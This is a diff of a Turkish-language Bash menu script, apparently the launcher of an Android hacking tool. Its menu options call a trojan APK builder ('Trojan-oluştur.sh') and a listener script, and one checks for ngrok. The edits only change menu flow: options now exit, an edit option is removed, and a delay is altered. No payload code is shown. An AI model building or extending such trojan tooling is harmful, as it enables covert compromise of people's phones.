@@ -73,21 +73,10 @@ echo
 echo
 if [[ $secim == 1 ]];then
 	bash Trojan-oluştur.sh
-	cd ..
-	echo
-	echo
-	echo
-	printf "\e[32m[✓] \e[97mTROJAN APK OLUŞTURULDU"
-	echo
-	echo
-	echo
-	sleep 2
-	bash Android-Hack.sh
+	exit
 elif [[ $secim == 2 ]];then
 	bash Dinleme.sh
-	cd ..
-	sleep 2
-	bash Android-Hack.sh
+	exit
 elif [[ $secim == 3 ]];then
 	cd ..
 	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
@@ -123,10 +112,6 @@ elif [[ $secim == x || $secim == X ]];then
 	echo
 	echo
 	exit
-elif [[ $secim == d || $secim == D || $secim == düzenle || $secim == DÜZENLE ]];then
-	cd ..
-	vim Android-Hack.sh
-	bash Android-Hack.sh
 else
 	echo
 	echo
@@ -136,7 +121,7 @@ else
 	echo
 	echo
 	cd ..
-	sleep 1
+	sleep 2
 	bash Android-Hack.sh
 fi
 
